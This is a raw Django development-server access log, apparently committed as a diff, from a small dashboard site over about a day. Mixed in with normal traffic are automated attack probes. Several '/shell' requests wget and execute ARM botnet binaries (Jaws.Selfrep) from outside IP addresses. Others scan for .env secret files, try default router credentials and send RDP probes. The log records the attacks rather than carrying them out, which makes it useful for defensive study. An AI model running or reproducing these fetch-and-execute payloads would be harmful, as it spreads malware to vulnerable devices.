+[31/Mar/2023 09:58:24] " P¼Òã " 400 -
+Invalid HTTP_HOST header: '5.188.210.227'. You may need to add '5.188.210.227' to ALLOWED_HOSTS.
+Bad Request: /http:/5.188.210.227/echo.php
+[31/Mar/2023 09:59:10] "GET http://5.188.210.227/echo.php HTTP/1.1" 400 64694
+[31/Mar/2023 10:03:15] "GET / HTTP/1.1" 301 0
+[31/Mar/2023 10:46:33] "GET /ReportServer HTTP/1.1" 301 0
+[31/Mar/2023 10:53:36] "GET / HTTP/1.1" 301 0
+[31/Mar/2023 11:13:58] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00')
+[31/Mar/2023 11:13:58] "  à          " 400 -
+[31/Mar/2023 11:47:12] "GET / HTTP/1.1" 301 0
+[31/Mar/2023 11:55:02] code 400, message Bad request version ('À\x13À')
+[31/Mar/2023 11:55:02] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /
+[31/Mar/2023 11:55:02] "GET / HTTP/1.1" 400 62771
+[31/Mar/2023 11:55:03] "GET /.env HTTP/1.1" 301 0
+[31/Mar/2023 12:16:21] code 400, message Bad request syntax ('MGLNDD_5.161.208.197_80')
+[31/Mar/2023 12:16:21] "MGLNDD_5.161.208.197_80" 400 -
+[31/Mar/2023 12:22:41] code 400, message Bad request version ('À\x14À')
+[31/Mar/2023 12:22:41] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[31/Mar/2023 12:22:52] "GET / HTTP/1.1" 301 0
+[31/Mar/2023 12:22:53] "GET /favicon.ico HTTP/1.1" 301 0
+[31/Mar/2023 12:22:54] "GET /robots.txt HTTP/1.1" 301 0
+[31/Mar/2023 12:22:54] "GET /sitemap.xml HTTP/1.1" 301 0
+Invalid HTTP_HOST header: 'stradvert'. You may need to add 'stradvert' to ALLOWED_HOSTS.
+Bad Request: /boaform/admin/formLogin
+[31/Mar/2023 12:47:10] "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0" 400 63606
+[31/Mar/2023 12:57:11] "GET / HTTP/1.1" 301 0
+[31/Mar/2023 13:33:53] code 400, message Bad request version ('À\x14À')
+[31/Mar/2023 13:33:53] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[31/Mar/2023 14:49:25] code 400, message Bad request syntax ('GET /shell?cd+/tmp;+wget+http:/\\/196.196.196.2/YourName/BinName.arm;+chmod+777+BinName.arm;+./BinName.arm Jaws.Selfrep;rm+-rf+BinName.arm HTTP/1.1')
+[31/Mar/2023 14:49:25] "GET /shell?cd+/tmp;+wget+http:/\/196.196.196.2/YourName/BinName.arm;+chmod+777+BinName.arm;+./BinName.arm Jaws.Selfrep;rm+-rf+BinName.arm HTTP/1.1" 400 -
+[31/Mar/2023 14:57:06] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 0
+[31/Mar/2023 14:57:06] code 400, message Bad request version ('À\x13À')
+[31/Mar/2023 14:57:06] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[31/Mar/2023 15:05:54,664] - Broken pipe from ('94.232.47.98', 48177)
+
+[31/Mar/2023 15:05:54] code 400, message Bad HTTP/0.9 request type ("\x03\x00\x00,'à\x00\x00\x00\x00\x00Cookie:")
+[31/Mar/2023 15:05:54] "  ,'à     Cookie: mstshash=Domain" 400 -
+[31/Mar/2023 15:05:55] code 400, message Bad HTTP/0.9 request type ("\x03\x00\x00,'à\x00\x00\x00\x00\x00Cookie:")
+[31/Mar/2023 15:05:55] "  ,'à     Cookie: mstshash=Domain" 400 -
+[31/Mar/2023 15:05:55] code 400, message Bad HTTP/0.9 request type ("\x03\x00\x00,'à\x00\x00\x00\x00\x00Cookie:")
+[31/Mar/2023 15:05:55] "  ,'à     Cookie: mstshash=Domain" 400 -
+[31/Mar/2023 15:09:05] code 400, message Bad request syntax ('GET /shell?cd+/tmp;+wget+http:/\\/196.196.196.2/YourName/BinName.arm;+chmod+777+BinName.arm;+./BinName.arm Jaws.Selfrep;rm+-rf+BinName.arm HTTP/1.1')
+[31/Mar/2023 15:09:05] "GET /shell?cd+/tmp;+wget+http:/\/196.196.196.2/YourName/BinName.arm;+chmod+777+BinName.arm;+./BinName.arm Jaws.Selfrep;rm+-rf+BinName.arm HTTP/1.1" 400 -
+[31/Mar/2023 15:15:48] "GET / HTTP/1.1" 301 0
+[31/Mar/2023 16:04:44] "GET / HTTP/1.1" 301 0
+[31/Mar/2023 16:51:07] "GET / HTTP/1.1" 301 0
+[31/Mar/2023 17:11:58] "POST /boaform/admin/formLogin HTTP/1.1" 301 0
+[31/Mar/2023 17:22:46] "GET / HTTP/1.1" 301 0
+[31/Mar/2023 17:28:43] code 400, message Bad request syntax ('GET /shell?cd+/tmp;+wget+http:/\\/98.159.98.243/AkitaXss/bin.arm;+chmod+777+bin.arm;+./bin.arm Jaws.Selfrep;rm+-rf+bin.arm HTTP/1.1')
+[31/Mar/2023 17:28:43] "GET /shell?cd+/tmp;+wget+http:/\/98.159.98.243/AkitaXss/bin.arm;+chmod+777+bin.arm;+./bin.arm Jaws.Selfrep;rm+-rf+bin.arm HTTP/1.1" 400 -
+[31/Mar/2023 18:03:10] "GET / HTTP/1.1" 301 0
+[31/Mar/2023 18:35:50] "GET /wp-login.php HTTP/1.1" 301 0
+[31/Mar/2023 18:35:50] "GET /wp-login.php HTTP/1.1" 302 0
+[31/Mar/2023 18:35:50] "GET /login/?next=/wp-login.php HTTP/1.1" 200 5163
+[31/Mar/2023 18:39:00] "GET / HTTP/1.1" 200 3497
+[31/Mar/2023 18:39:00] "GET /favicon.ico HTTP/1.1" 302 0
+[31/Mar/2023 18:39:01] "GET /login/?next=/favicon.ico HTTP/1.1" 200 5163
+[31/Mar/2023 18:42:42] "GET /actuator/gateway/routes HTTP/1.1" 301 0
+[31/Mar/2023 19:08:04] "GET / HTTP/1.1" 301 0
+[31/Mar/2023 19:08:07] "GET / HTTP/1.1" 200 3497
+[31/Mar/2023 19:08:26] "GET / HTTP/1.1" 200 3497
+[31/Mar/2023 19:18:16] "GET / HTTP/1.1" 301 0
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[31/Mar/2023 19:35:18] "GET / HTTP/1.1" 400 64477
+[31/Mar/2023 19:45:41] "GET / HTTP/1.1" 301 0
+Invalid HTTP_HOST header: '127.0.0.1:80'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+Bad Request: /shell
+Invalid HTTP_HOST header: 'stradvert'. You may need to add 'stradvert' to ALLOWED_HOSTS.
+Bad Request: /
+[31/Mar/2023 20:22:02] "GET / HTTP/1.0" 400 62704
+[31/Mar/2023 20:22:23] "POST /boaform/admin/formLogin HTTP/1.1" 301 0
+[31/Mar/2023 21:02:37] "GET / HTTP/1.1" 301 0
+[31/Mar/2023 21:27:04] "GET / HTTP/1.1" 301 0
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /robots.txt
+[31/Mar/2023 21:33:37] "GET /robots.txt HTTP/1.1" 400 64839
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[31/Mar/2023 21:33:37] "GET / HTTP/1.1" 400 64852
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[31/Mar/2023 21:33:38] "GET / HTTP/1.1" 400 65164
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /favicon.ico
+[31/Mar/2023 21:33:39] "GET /favicon.ico HTTP/1.1" 400 64866
+[31/Mar/2023 21:42:19] "GET /aaa9 HTTP/1.1" 301 0
+[31/Mar/2023 21:42:21] code 400, message Bad request version ('À\x14À')
+[31/Mar/2023 21:42:21] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[31/Mar/2023 21:42:26] "GET / HTTP/1.1" 301 0
+[31/Mar/2023 21:42:27] "GET /aab8 HTTP/1.1" 301 0
+[31/Mar/2023 21:42:35] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03<Ó×å6XikgÑì\x96§ôææyõZ]ÊP\x80£5írÅ£\x0e×â\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+[31/Mar/2023 21:42:35] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[31/Mar/2023 21:42:41] "GET / HTTP/1.1" 301 0
+[31/Mar/2023 21:42:49] code 400, message Bad request version ('À\x14À')
+[31/Mar/2023 21:42:49] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[31/Mar/2023 22:08:38] "GET /.env HTTP/1.1" 301 0
+[31/Mar/2023 22:08:46] "GET /.env.example HTTP/1.1" 301 0
+[31/Mar/2023 22:08:54] "GET /blog/.env HTTP/1.1" 301 0
+[31/Mar/2023 22:09:03] "GET /api/.env HTTP/1.1" 301 0
+[31/Mar/2023 22:09:11] "GET /laravel/.env HTTP/1.1" 301 0
+[31/Mar/2023 22:09:19] "GET /docs/.env HTTP/1.1" 301 0
+[31/Mar/2023 22:09:27] "GET /_profiler/phpinfo HTTP/1.1" 301 0
+[31/Mar/2023 22:09:35] "GET / HTTP/1.1" 301 0
+[31/Mar/2023 22:09:36] "GET /laravel/.env HTTP/1.1" 301 0
+[31/Mar/2023 22:15:11] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[31/Mar/2023 22:15:11] "  /*à     Cookie: mstshash=Administr" 400 -
+[31/Mar/2023 22:30:15] "GET / HTTP/1.1" 301 0
+[31/Mar/2023 23:23:46] "GET /aaa9 HTTP/1.1" 301 0
+[31/Mar/2023 23:23:51] code 400, message Bad request version ('À\x14À')
+[31/Mar/2023 23:23:51] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[31/Mar/2023 23:23:55] "GET /aab8 HTTP/1.1" 301 0
+[31/Mar/2023 23:24:05] code 400, message Bad request version ('À\x14À')
+[31/Mar/2023 23:24:05] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[31/Mar/2023 23:24:10] "GET / HTTP/1.1" 301 0
+[31/Mar/2023 23:24:14] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x13®õî+\x82ÊðÚgQxÇ\x9eþ`¢YÁnÒXî¬\x8b»Ë¤\x96SÄí\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+[31/Mar/2023 23:24:14] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[31/Mar/2023 23:43:09] "GET / HTTP/1.1" 301 0
+[31/Mar/2023 23:43:10] code 400, message Bad request version ('À\x13À')
+[31/Mar/2023 23:43:10] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[31/Mar/2023 23:51:47] "GET / HTTP/1.1" 301 0
+[31/Mar/2023 23:55:07] "GET /robots.txt HTTP/1.1" 302 0
+[31/Mar/2023 23:55:08] "GET /login/?next=/robots.txt HTTP/1.1" 200 5163
+[01/Apr/2023 00:10:46] "POST /boaform/admin/formLogin HTTP/1.1" 301 0
+[01/Apr/2023 00:13:01] "GET /aaa9 HTTP/1.1" 301 0
+[01/Apr/2023 00:13:08] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03(¶¹OéÌa³\x06\x12Ó\x18Ô\x97/úô\x90¿\x9d¶¦\x7fHBå\x9d.\x89à¯(\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+[01/Apr/2023 00:13:08] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[01/Apr/2023 00:13:13] "GET /aab8 HTTP/1.1" 301 0
+[01/Apr/2023 00:13:17] code 400, message Bad request version ('À\x14À')
+[01/Apr/2023 00:13:17] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[01/Apr/2023 00:13:19] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 00:13:23] code 400, message Bad request version ('À\x14À')
+[01/Apr/2023 00:13:23] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[01/Apr/2023 00:18:20] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 00:42:50] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 00:42:50] "GET / HTTP/1.1" 200 3497
+[01/Apr/2023 00:43:25] "GET / HTTP/1.1" 301 0
+Invalid HTTP_HOST header: 'stradvert'. You may need to add 'stradvert' to ALLOWED_HOSTS.
+Bad Request: /
+[01/Apr/2023 01:14:33] "GET / HTTP/1.0" 400 63010
+[01/Apr/2023 01:22:51] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03ÂâF"Wß\x18@xÛ\x13\x84jì±ð\x9e\x91\x86®¶¾\x17\x187\x885µßb\x9em\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+[01/Apr/2023 01:22:51] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[01/Apr/2023 01:22:51] code 400, message Bad request version ('À\x14À')
+[01/Apr/2023 01:22:51] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[01/Apr/2023 01:22:51] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 01:22:51] "GET /client/get_targets HTTP/1.1" 301 0
+[01/Apr/2023 01:22:51] "GET /upl.php HTTP/1.1" 301 0
+[01/Apr/2023 01:22:51] code 400, message Bad request syntax ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03ó\x12JS\x07\x83¤Éi\x9eö\x1bs0£NÿÄÈzâ}')
+[01/Apr/2023 01:22:51] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[01/Apr/2023 01:22:51] "GET /geoip/ HTTP/1.1" 301 0
+[01/Apr/2023 01:22:52] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 01:22:52] "GET /favicon.ico HTTP/1.1" 301 0
+[01/Apr/2023 01:25:57] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 01:30:06] "HEAD /ads.txt HTTP/1.1" 302 0
+[01/Apr/2023 01:30:06] "HEAD /login/?next=/ads.txt HTTP/1.1" 200 5163
+[01/Apr/2023 01:30:06] "GET /ads.txt HTTP/1.1" 302 0
+[01/Apr/2023 01:30:07] "GET /login/?next=/ads.txt HTTP/1.1" 200 5163
+[01/Apr/2023 01:39:15,739] - Broken pipe from ('167.248.133.36', 56350)
+
+[01/Apr/2023 01:39:16] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 01:39:16] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 01:39:16] code 505, message Invalid HTTP version (2.0)
+[01/Apr/2023 01:39:16] "PRI * HTTP/2.0" 505 -
+[01/Apr/2023 02:02:29] code 400, message Bad request version ('ô')
+[01/Apr/2023 02:02:29] "H   tj¨#D+Êð§»lÅ×¶íJnÁùxu[lðE-jìÔxLÉrÉuà%Rtgfv]%ÌèÏ® µÀfÈDÅ	ô" 400 -
+[01/Apr/2023 02:05:58] "POST /boaform/admin/formLogin HTTP/1.1" 301 0
+[01/Apr/2023 02:26:21] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 02:36:45] "GET /.env HTTP/1.1" 301 0
+[01/Apr/2023 02:36:45] code 400, message Bad request version ('lz3&/\x80\x94ÈáH·%²ó,º\x94øÆ\xad\x00b\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00£\x00\x9f\x00¢\x00\x9eÌªÀ¯À\xadÀ$À(À')
+[01/Apr/2023 02:36:45] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[01/Apr/2023 04:03:06] "POST /boaform/admin/formLogin HTTP/1.1" 301 0
+[01/Apr/2023 04:15:43] "GET /plugins/jQuery-File-Upload/server/php/index.php?file=tf2rghf.jpg HTTP/1.1" 301 0
+[01/Apr/2023 04:16:23] "GET /plugins/jQuery-File-Upload/server/php/index.php?file=tf2rghf.jpg HTTP/1.1" 302 0
+[01/Apr/2023 04:24:09] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 04:24:56] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 04:32:11] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 04:51:46] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 04:54:24] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 04:59:36] "OPTIONS / HTTP/1.1" 301 0
+[01/Apr/2023 05:17:22] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 06:09:35] "GET /sitemap.xml HTTP/1.1" 302 0
+[01/Apr/2023 06:09:35] "GET /login/?next=/sitemap.xml HTTP/1.1" 200 5163
+[01/Apr/2023 06:10:29] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 06:37:56] "POST /boaform/admin/formLogin HTTP/1.1" 301 0
+[01/Apr/2023 06:59:59] "GET / HTTP/1.1" 200 3497
+[01/Apr/2023 07:00:00] "GET / HTTP/1.1" 200 3497
+[01/Apr/2023 07:00:01] "GET /static/assets/vendor/nucleo/css/nucleo.css HTTP/1.1" 200 9015
+[01/Apr/2023 07:00:01] "GET /static/assets/vendor/jquery.scrollbar/jquery.scrollbar.min.js HTTP/1.1" 200 13026
+[01/Apr/2023 07:00:01] "GET /static/assets/js/argon.js?v=1.2.0 HTTP/1.1" 200 21706
+[01/Apr/2023 07:00:01] "GET /static/assets/vendor/jquery-scroll-lock/dist/jquery-scrollLock.min.js HTTP/1.1" 200 4587
+[01/Apr/2023 07:00:01] "GET /static/assets/vendor/js-cookie/js.cookie.js HTTP/1.1" 200 3886
+[01/Apr/2023 07:00:01] "GET /static/assets/vendor/@fortawesome/fontawesome-free/css/all.min.css HTTP/1.1" 200 57180
+[01/Apr/2023 07:00:01] "GET /static/assets/vendor/jquery/dist/jquery.min.js HTTP/1.1" 200 88145
+[01/Apr/2023 07:00:02] "GET /static/assets/vendor/bootstrap/dist/js/bootstrap.bundle.min.js HTTP/1.1" 200 80650
+[01/Apr/2023 07:00:02] "GET /static/assets/css/argon.css?v=1.2.0 HTTP/1.1" 200 455973
+[01/Apr/2023 07:00:04] "GET /static/assets/vendor/nucleo/fonts/nucleo-icons.woff2 HTTP/1.1" 200 8580
+[01/Apr/2023 07:00:09] "GET / HTTP/1.1" 200 3497
+[01/Apr/2023 07:00:13] "GET / HTTP/1.1" 200 3497
+[01/Apr/2023 07:00:15] "GET / HTTP/1.1" 200 3497
+[01/Apr/2023 07:00:16] "GET /static/assets/img/theme/str-logo.png HTTP/1.1" 200 24457
+[01/Apr/2023 07:00:17] "GET /static/assets/img/brand/str.jpeg HTTP/1.1" 200 492705
+[01/Apr/2023 07:00:18] "GET /static/str-logo.png HTTP/1.1" 200 24457
+[01/Apr/2023 07:00:20] "GET / HTTP/1.1" 200 3497
+[01/Apr/2023 07:00:23] "GET /login/ HTTP/1.1" 200 5163
+[01/Apr/2023 07:01:07] "POST /login/ HTTP/1.1" 302 0
+[01/Apr/2023 07:01:08] "GET /dashboard HTTP/1.1" 200 13279
+[01/Apr/2023 07:01:09] "GET /static/assets/vendor/chart.js/dist/Chart.extension.js HTTP/1.1" 200 3552
+[01/Apr/2023 07:01:09] "GET /static/assets/vendor/@fortawesome/fontawesome-free/webfonts/fa-solid-900.woff2 HTTP/1.1" 200 76084
+[01/Apr/2023 07:01:10] "GET /static/assets/vendor/chart.js/dist/Chart.min.js HTTP/1.1" 200 172812
+[01/Apr/2023 07:01:35] "GET /dashboard HTTP/1.1" 200 13279
+[01/Apr/2023 07:15:40] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 07:21:08] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 07:32:25,418] - Broken pipe from ('167.94.138.49', 57708)
+
+[01/Apr/2023 07:32:26] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 07:32:26] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 07:32:26] code 505, message Invalid HTTP version (2.0)
+[01/Apr/2023 07:32:26] "PRI * HTTP/2.0" 505 -
+[01/Apr/2023 07:46:34] "POST /boaform/admin/formLogin HTTP/1.1" 301 0
+[01/Apr/2023 07:57:01] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 08:09:04] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 08:37:29] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 09:00:07] "GET /actuator/health HTTP/1.1" 301 0
+[01/Apr/2023 09:16:14] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 09:23:26] "GET /hudson HTTP/1.1" 301 0
+[01/Apr/2023 09:28:54] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 09:38:03] "GET /robots.txt HTTP/1.1" 301 0
+[01/Apr/2023 09:38:03] "GET /robots.txt HTTP/1.1" 302 0
+[01/Apr/2023 09:38:03] "GET /login/?next=/robots.txt HTTP/1.1" 200 5163
+[01/Apr/2023 09:38:05] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 09:38:05] "GET /robots.txt HTTP/1.1" 302 0
+[01/Apr/2023 09:38:05] "GET /login/?next=/robots.txt HTTP/1.1" 200 5163
+[01/Apr/2023 09:38:06] "GET / HTTP/1.1" 200 3497
+[01/Apr/2023 09:39:51,833] - Broken pipe from ('162.158.86.173', 52194)
+
+[01/Apr/2023 09:40:57,587] - Broken pipe from ('162.158.87.158', 55816)
+
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[01/Apr/2023 09:44:10] "GET / HTTP/1.1" 400 64530
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[01/Apr/2023 09:51:45] "GET / HTTP/1.1" 400 64707
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[01/Apr/2023 09:53:15] "GET / HTTP/1.1" 400 64532
+[01/Apr/2023 10:22:46] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 12:05:32] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 12:05:33] "GET /robots.txt HTTP/1.1" 301 0
+[01/Apr/2023 12:05:34] "GET /sitemap.xml HTTP/1.1" 301 0
+[01/Apr/2023 12:05:34] "GET /.well-known/security.txt HTTP/1.1" 301 0
+[01/Apr/2023 12:05:35] "GET /favicon.ico HTTP/1.1" 301 0
+[01/Apr/2023 12:05:47] code 400, message Bad HTTP/0.9 request type ('\x03\x11')
+[01/Apr/2023 12:05:47] "(d                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            " 400 -
+[01/Apr/2023 12:10:37] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 12:11:56] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 12:12:32] "GET /favicon.ico HTTP/1.1" 301 0
+[01/Apr/2023 12:13:22] "GET /geoserver/web/ HTTP/1.1" 301 0
+[01/Apr/2023 12:19:54] "POST /boaform/admin/formLogin HTTP/1.1" 301 0
+[01/Apr/2023 12:30:54] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 12:33:04] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 12:52:42] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 13:03:51] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 13:09:54] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 13:09:54] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 13:27:15] "GET / HTTP/1.1" 200 3497
+[01/Apr/2023 13:27:49] "GET /static/str-logo.png HTTP/1.1" 200 24457
+[01/Apr/2023 13:27:58] "GET /robots.txt HTTP/1.1" 302 0
+[01/Apr/2023 13:27:59] "GET /login/?next=/robots.txt HTTP/1.1" 200 5163
+[01/Apr/2023 13:28:02] "GET /sitemap.xml HTTP/1.1" 302 0
+[01/Apr/2023 13:28:04] "GET /login/?next=/sitemap.xml HTTP/1.1" 200 5163
+[01/Apr/2023 13:28:11] "GET /static/assets/vendor/jquery/dist/jquery.min.js HTTP/1.1" 200 88145
+[01/Apr/2023 13:28:11] "GET /static/assets/vendor/jquery.scrollbar/jquery.scrollbar.min.js HTTP/1.1" 200 13026
+[01/Apr/2023 13:28:11] "GET /static/assets/vendor/bootstrap/dist/js/bootstrap.bundle.min.js HTTP/1.1" 200 80650
+[01/Apr/2023 13:28:12] "GET /static/assets/vendor/js-cookie/js.cookie.js HTTP/1.1" 200 3886
+[01/Apr/2023 13:28:13] "GET /static/assets/vendor/jquery-scroll-lock/dist/jquery-scrollLock.min.js HTTP/1.1" 200 4587
+[01/Apr/2023 13:28:14] "GET /static/assets/js/argon.js?v=1.2.0 HTTP/1.1" 200 21706
+[01/Apr/2023 13:31:14] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 13:32:27] code 400, message Bad request version ('À\x14À')
+[01/Apr/2023 13:32:27] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[01/Apr/2023 13:32:54] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 13:50:34] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 14:50:09] "GET / HTTP/1.1" 200 3497
+[01/Apr/2023 14:50:10] "GET /static/assets/vendor/jquery.scrollbar/jquery.scrollbar.min.js HTTP/1.1" 200 13026
+[01/Apr/2023 14:50:10] "GET /static/assets/vendor/nucleo/css/nucleo.css HTTP/1.1" 200 9015
+[01/Apr/2023 14:50:10] "GET /static/assets/img/theme/str-logo.png HTTP/1.1" 200 24457
+[01/Apr/2023 14:50:10] "GET /static/assets/vendor/@fortawesome/fontawesome-free/css/all.min.css HTTP/1.1" 200 57180
+[01/Apr/2023 14:50:10] "GET /static/assets/vendor/jquery-scroll-lock/dist/jquery-scrollLock.min.js HTTP/1.1" 200 4587
+[01/Apr/2023 14:50:10] "GET /static/assets/js/argon.js?v=1.2.0 HTTP/1.1" 200 21706
+[01/Apr/2023 14:50:10] "GET /static/assets/vendor/js-cookie/js.cookie.js HTTP/1.1" 200 3886
+[01/Apr/2023 14:50:10] "GET /static/assets/vendor/bootstrap/dist/js/bootstrap.bundle.min.js HTTP/1.1" 200 80650
+[01/Apr/2023 14:50:11] "GET /static/assets/vendor/jquery/dist/jquery.min.js HTTP/1.1" 200 88145
+[01/Apr/2023 14:50:11] "GET /static/assets/img/brand/str.jpeg HTTP/1.1" 200 492705
+[01/Apr/2023 14:50:11] "GET /static/assets/css/argon.css?v=1.2.0 HTTP/1.1" 200 455973
+[01/Apr/2023 14:50:13] "GET / HTTP/1.1" 200 3497
+[01/Apr/2023 14:50:13] "GET /static/assets/vendor/nucleo/fonts/nucleo-icons.woff2 HTTP/1.1" 200 8580
+[01/Apr/2023 14:50:14] "GET /static/str-logo.png HTTP/1.1" 200 24457
+[01/Apr/2023 14:50:21] "GET / HTTP/1.1" 200 3497
+[01/Apr/2023 14:50:22] "GET / HTTP/1.1" 200 3497
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[01/Apr/2023 15:04:22] "GET / HTTP/1.1" 400 64706
+[01/Apr/2023 15:17:58] "GET / HTTP/1.1" 301 0
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+[01/Apr/2023 15:24:24] "GET /.env HTTP/1.1" 302 0
+Bad Request: /.env
+[01/Apr/2023 15:24:24] "GET /.env HTTP/1.1" 400 64849
+[01/Apr/2023 15:24:27] "GET /.env HTTP/1.1" 301 0
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /.env
+[01/Apr/2023 15:24:27] "GET /.env HTTP/1.1" 400 64627
+[01/Apr/2023 15:25:13] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 15:25:37] "GET / HTTP/1.1" 200 3497
+[01/Apr/2023 15:25:41] "GET /static/str-logo.png HTTP/1.1" 200 24457
+[01/Apr/2023 15:25:45] "GET /robots.txt HTTP/1.1" 301 0
+[01/Apr/2023 15:26:24] "GET /sitemap.xml HTTP/1.1" 301 0
+[01/Apr/2023 15:26:27] "GET /sitemap.xml HTTP/1.1" 302 0
+[01/Apr/2023 15:26:28] "GET /login/?next=/sitemap.xml HTTP/1.1" 200 5163
+[01/Apr/2023 15:26:30] "GET /static/assets/vendor/jquery.scrollbar/jquery.scrollbar.min.js HTTP/1.1" 200 13026
+[01/Apr/2023 15:26:30] "GET /static/assets/js/argon.js?v=1.2.0 HTTP/1.1" 200 21706
+[01/Apr/2023 15:26:30] "GET /static/assets/vendor/bootstrap/dist/js/bootstrap.bundle.min.js HTTP/1.1" 200 80650
+[01/Apr/2023 15:26:30] "GET /static/assets/vendor/jquery/dist/jquery.min.js HTTP/1.1" 200 88145
+[01/Apr/2023 15:26:33] "GET /static/assets/vendor/jquery-scroll-lock/dist/jquery-scrollLock.min.js HTTP/1.1" 200 4587
+[01/Apr/2023 15:45:44] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 16:09:55] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 16:11:42] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 16:24:26] "GET /wp-login.php HTTP/1.1" 301 0
+[01/Apr/2023 16:24:26] "GET /wp-login.php HTTP/1.1" 302 0
+[01/Apr/2023 16:24:27] "GET /login/?next=/wp-login.php HTTP/1.1" 200 5163
